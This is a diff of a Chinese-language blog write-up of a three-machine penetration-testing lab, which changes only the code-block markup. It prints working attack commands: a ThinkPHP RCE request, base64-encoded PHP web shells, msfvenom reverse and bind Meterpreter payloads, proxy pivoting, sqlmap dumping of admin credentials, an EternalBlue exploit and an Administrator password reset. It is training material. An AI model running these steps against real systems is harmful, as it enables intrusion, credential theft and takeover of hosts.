@@ -461,64 +461,115 @@
 <p>注意：这里桥接模式的网卡设置成自己能联网的网卡即可，因为我发现设置成自动有时会存在虚拟机连不上外网的情况。</p>
 </blockquote>
 <h1 id="0x02-Target1"><a href="#0x02-Target1" class="headerlink" title="0x02 Target1"></a>0x02 Target1</h1><h2 id="a、获取shell"><a href="#a、获取shell" class="headerlink" title="a、获取shell"></a>a、获取shell</h2><p>1、先用nmap扫描一下Target1</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -T4 -O 192.168.1.11</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-04 05:51 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.11</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">Not shown: 994 filtered ports</span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">20/tcp   closed ftp-data</span><br><span class="line">21/tcp   open   ftp</span><br><span class="line">22/tcp   open   ssh</span><br><span class="line">80/tcp   open   http</span><br><span class="line">888/tcp  open   accessbuilder</span><br><span class="line">8888/tcp open   sun-answerbook</span><br><span class="line">MAC Address: 00:0C:29:81:A6:6D (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.11</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.97 seconds</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">root@kali:~# nmap -T4 -O 192.168.1.11
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-04 05:51 EDT
+Nmap scan report for 192.168.1.11
+Host is up (0.00042s latency).
+Not shown: 994 filtered ports
+PORT     STATE  SERVICE
+20/tcp   closed ftp-data
+21/tcp   open   ftp
+22/tcp   open   ssh
+80/tcp   open   http
+888/tcp  open   accessbuilder
+8888/tcp open   sun-answerbook
+MAC Address: 00:0C:29:81:A6:6D (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.10 - 4.11
+Network Distance: 1 hop
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.97 seconds</code></pre>
 <p>可以看到Target1存在ftp、ssh、http等端口，且是一个Linux的操作系统。</p>
 <p>2、既然存在http服务，那就用浏览器打开看看是个什么<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS3.png"><br>3、原来是ThinkPHP 5.X框架，这不禁让我想到18年底爆出的该框架的远程命令执行漏洞，那就先用POC测试一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure>
+<pre><code>/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS4.png"><br>4、成功出现了PHPinfo界面，说明该版本是存在这在漏洞的，接下来就可以直接上工具写入一句话了，当然也可以使用POC写入一句话，不过还是工具方便些<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS5.png"><br>5、在工具中命令是可以被执行的，那就getshell吧<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS6.png"><br>6、昂~ getshell失败，没关系，直接echo写入一句话</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;TeamsSix&#x27;]);?&gt;&quot;</span> &gt; shell.php</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">echo &quot;&lt;?php @eval($_POST[&#39;TeamsSix&#39;]);?&gt;&quot; &gt; shell.php</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS7.png"><br>7、通过浏览器访问，查看shell.php是否上传成功<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS8.png"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS9.png"><br>8、可以看到shell.php已经被上传上去了，但是提示语法错误，同时蚁剑也返回数据为空，看来一句话上传的有点问题，那就cat查看一下<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS10.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">之前：&lt;?php @eval($_POST[&#39;TeamsSix&#39;]);?&gt;</span><br><span class="line">之后：&lt;?php @eval([&#39;TeamsSix&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
-
+<pre><code>之前：&lt;?php @eval($_POST[&#39;TeamsSix&#39;]);?&gt;
+之后：&lt;?php @eval([&#39;TeamsSix&#39;]);?&gt;</code></pre>
 <p>9、不难发现$_POST被过滤了，那就利用Base64编码后再次上传试试</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydUZWFtc1NpeCddKTs/Pg==&quot;</span> | base64 -d &gt; shell.php</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">echo &quot;PD9waHAgQGV2YWwoJF9QT1NUWydUZWFtc1NpeCddKTs/Pg==&quot; | base64 -d &gt; shell.php</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS11.png"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS12.png"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS13.png"><br>10、此时可以看到一句话已经正常，蚁剑也能够连接成功，此时已经获取到该主机的shell，下一步添加代理<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS14.png"></p>
 <h2 id="b、设置代理"><a href="#b、设置代理" class="headerlink" title="b、设置代理"></a>b、设置代理</h2><blockquote>
 <p>注：本文中设置代理的方法参考安全客里面tinyfisher用户的一篇文章，其文章地址在本文末尾参考文章处。</p>
 </blockquote>
 <p>1、查看自己的IP地址，并根据自己的IP地址及目标靶机的系统类型生成对应的后门文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ifconfig</span></span><br><span class="line">root@kali:~<span class="comment"># msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=6666 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf &gt;shell.elf</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">root@kali:~# ifconfig
+root@kali:~# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=6666 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf &gt;shell.elf</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS15.png"><br>2、在kali中配置运行监听模块</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfconsole</span></span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 0.0.0.0</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 6666</span><br><span class="line">msf5 exploit(multi/handler) &gt; options</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">root@kali:~# msfconsole
+msf5 &gt; use exploit/multi/handler
+msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) &gt; set lhost 0.0.0.0
+msf5 exploit(multi/handler) &gt; set lport 6666
+msf5 exploit(multi/handler) &gt; options
+msf5 exploit(multi/handler) &gt; run</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS16.png"><br>3、通过蚁剑将shell.elf文件上传到Target1中，并赋予777权限以执行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(www:/www/wwwroot/ThinkPHP/public) $ chmod 777 shell.elf</span><br><span class="line">(www:/www/wwwroot/ThinkPHP/public) $ ./shell.elf</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">(www:/www/wwwroot/ThinkPHP/public) $ chmod 777 shell.elf
+(www:/www/wwwroot/ThinkPHP/public) $ ./shell.elf</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS17.png"><br>4、此时MSF获取到shell，通过meterpreter添加第二层的路由</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.22.0/24</span><br><span class="line">run autoroute -p</span><br><span class="line"></span><br><span class="line">这一步也可以使用run post/multi/manage/autoroute自动添加路由</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">run autoroute -s 192.168.22.0/24
+run autoroute -p
+
+这一步也可以使用run post/multi/manage/autoroute自动添加路由</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS18.png"><br>5、在MSF中添加代理，以便让攻击机访问靶机2，经过多次测试，发现MSF使用socks5代理总是失败，因此这里还是采用了socks4</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/server/socks4a</span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; <span class="built_in">set</span> srvport 2222</span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; options</span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; run</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">msf5 &gt; use auxiliary/server/socks4a
+msf5 auxiliary(server/socks4a) &gt; set srvport 2222
+msf5 auxiliary(server/socks4a) &gt; options
+msf5 auxiliary(server/socks4a) &gt; run</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS19.png"><br>6、修改proxychains-ng的配置文件，这里也可以使用proxychains进行代理，不过前者是后者的升级版，因此这里使用proxychains-ng进行代理</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># vim /etc/proxychains.conf</span></span><br><span class="line">加入以下内容：</span><br><span class="line">socks4 	192.168.1.113 	2222</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">root@kali:~# vim /etc/proxychains.conf
+加入以下内容：
+socks4     192.168.1.113     2222</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS120.png"><br>7、尝试扫描靶机2，该步骤如果一直提示超时，可以把MSF退出再重新配置</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># proxychains4 nmap -Pn -sT 192.168.22.22</span></span><br><span class="line">-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</span><br><span class="line">-sT：扫描TCP数据包已建立的连接connect</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">root@kali:~# proxychains4 nmap -Pn -sT 192.168.22.22
+-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。
+-sT：扫描TCP数据包已建立的连接connect</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS21.png"></p>
 <h1 id="0x03-Target2"><a href="#0x03-Target2" class="headerlink" title="0x03 Target2"></a>0x03 Target2</h1><h2 id="a、获取shell-1"><a href="#a、获取shell-1" class="headerlink" title="a、获取shell"></a>a、获取shell</h2><p>1、上一步发现存在80端口，因此我们设置好浏览器代理后，打开看看<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS22.png"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS23.png"><br>2、拿到站点后，经过简单的信息收集，不难找到robots.txt文件中隐藏的后台地址以及主页源码中给的提示<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS24.png"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS25.png"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS26.png"><br>3、目前为止，步骤就很鲜明了，利用SQL注入找到后台管理员账号密码，那就用sqlmap开整吧</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">root@kali:~# proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS27.png"><br>4、已经发现了此站点的数据库为MySQL，使用的Nginx和php，接下来找库</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword --dbs</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">root@kali:~# proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword --dbs</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS28.png"><br>5、看看bagecms下有哪些表</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms --tables</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">root@kali:~# proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms --tables</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS29.png"><br>6、看一下bage_admin下的内容</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms -T bage_admin --columns</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">root@kali:~# proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms -T bage_admin --columns</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS30.png"><br>7、username、password自然是最感兴趣的啦，给它dump下来，在dump的过程中sqlmap会有一些提示，一路yes就行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms -T bage_admin -C username,password --dump</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">root@kali:~# proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms -T bage_admin -C username,password --dump</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS31.png"><br>8、找到我们想要的了，登陆后台，看看有哪些功能<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS32.png"><br>9、后台里面有文件上传的地方，有编辑主页文件的地方，为了方便，我们直接把一句话写入网站文件中<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS33.png"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS34.png"><br>10、来到标签页，可以看到一句话生效了，接下里在SocksCap中打开蚁剑，利用蚁剑连接，注意SocksCap设置好代理<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS35.png"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS36.png"></p>
 <h2 id="b、设置代理-1"><a href="#b、设置代理-1" class="headerlink" title="b、设置代理"></a>b、设置代理</h2><p>1、蚁剑中可以看到这是一个64位的linux系统，据此信息在MSF中生成后门</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4321 -f elf &gt; shell2.elf</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">root@kali:~# msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4321 -f elf &gt; shell2.elf</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS37.png"><br>2、利用蚁剑将shell2.elf上传到Target2并开启监听</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(www:/www/wwwroot/upload) $ chmod 777 shell2.elf</span><br><span class="line">(www:/www/wwwroot/upload) $ ./shell2.elf</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">(www:/www/wwwroot/upload) $ chmod 777 shell2.elf
+(www:/www/wwwroot/upload) $ ./shell2.elf</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS38.png"></p>
 <p>3、在MSF中开启EXP，与Target2建立连接，这里需要注意，上一次代理使用的reverse_tcp是MSF作为监听，让Target1连到我们，而这次代理使用的bind_tcp是Target2作为监听，我们需要连到Target2，这个逻辑正好是相反的。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> RHOST 192.168.22.22</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 4321</span><br><span class="line">msf5 exploit(multi/handler) &gt; options</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">msf5 &gt; use exploit/multi/handler
+msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/bind_tcp
+msf5 exploit(multi/handler) &gt; set RHOST 192.168.22.22
+msf5 exploit(multi/handler) &gt; set LPORT 4321
+msf5 exploit(multi/handler) &gt; options
+msf5 exploit(multi/handler) &gt; run</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS39.png"><br>4、与之前一样，我们添加Target3的路由，这里就不用设置代理了，直接添加路由即可</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.33.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">run autoroute -s 192.168.33.0/24
+run autoroute -p</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS40.png"><br>5、尝试扫描Target3</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># proxychains4 nmap -Pn -sT 192.168.33.33</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">root@kali:~# proxychains4 nmap -Pn -sT 192.168.33.33</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS43.png"></p>
 <h1 id="0x03-Target3"><a href="#0x03-Target3" class="headerlink" title="0x03 Target3"></a>0x03 Target3</h1><h2 id="a、获取shell-2"><a href="#a、获取shell-2" class="headerlink" title="a、获取shell"></a>a、获取shell</h2><p>1、从扫描的结果来看，不难看出这是一个开放着445、3389端口的Windows系统，那就先用永恒之蓝攻击试试</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> RHOST 192.168.33.33</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_psexec) &gt; run</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">msf5 &gt; use exploit/windows/smb/ms17_010_psexec
+msf5 exploit(windows/smb/ms17_010_psexec) &gt; set payload windows/meterpreter/bind_tcp
+msf5 exploit(windows/smb/ms17_010_psexec) &gt; set RHOST 192.168.33.33
+msf5 exploit(windows/smb/ms17_010_psexec) &gt; options
+msf5 exploit(windows/smb/ms17_010_psexec) &gt; run</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS44.png"></p>
 <p>2、查看账户，直接修改账户密码，利用3389连接，注意要在SocksCap中运行连接远程桌面程序</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">C:\Windows\system32&gt;net user</span><br><span class="line">C:\Windows\system32&gt;net user Administrator 123</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">meterpreter &gt; shell
+C:\Windows\system32&gt;net user
+C:\Windows\system32&gt;net user Administrator 123</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS45.png"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS46.png"></p>
 <h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>到目前为止，三台靶机都已经拿下，这里推荐读者能够自己亲手尝试，找到里面的flag，其中所有flag的找寻方式，会在我的公众号“TeamsSix”推送，这里只讲述拿下三台靶机的方法。<br>这次的练习耗费了自己的大量时间，从靶场搭建到获取到第三层靶机的shell，这其中碰到的一些问题及我自己踩过的一些坑记录在下面：</p>
 <p>1、蚁剑中查看一些文件会提示权限不足，在meterpreter中可以正常查看<br>2、蚁剑中在Target2里执行命令或者查看文件时不时会失败，初步判断是因为本地网络代理的原因，多试几次就行，总有一次是成功的<br>3、MSF中Socks5代理模块使用总是失败，Socks4a模块使用成功<br>4、MSF中建立的会话总是自动断开，将会话连接的靶机上的防火墙关闭即可<br>5、MSF中ms17_010_eternalblue模块利用总是失败，ms17_010_psexec模块使用成功<br>6、meterpreter中查看文件的路径和Windows下文件的路径里的“/”是相反的<br>7、meterpreter中上传文件大小貌似有限制，文件上传到8M左右就会提示失败，因此需要将文件压缩成多个小文件进行上传，同时上传7-zip工具（该工具只有1M大小），再利用7-zip对其解压即可，当然此方法仅适用于Windows，linux上的方法可以自行谷歌</p>
@@ -960,7 +1011,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">115.1k</span>&nbsp;字
+                class="white-color">114.7k</span>&nbsp;字
             
             
             
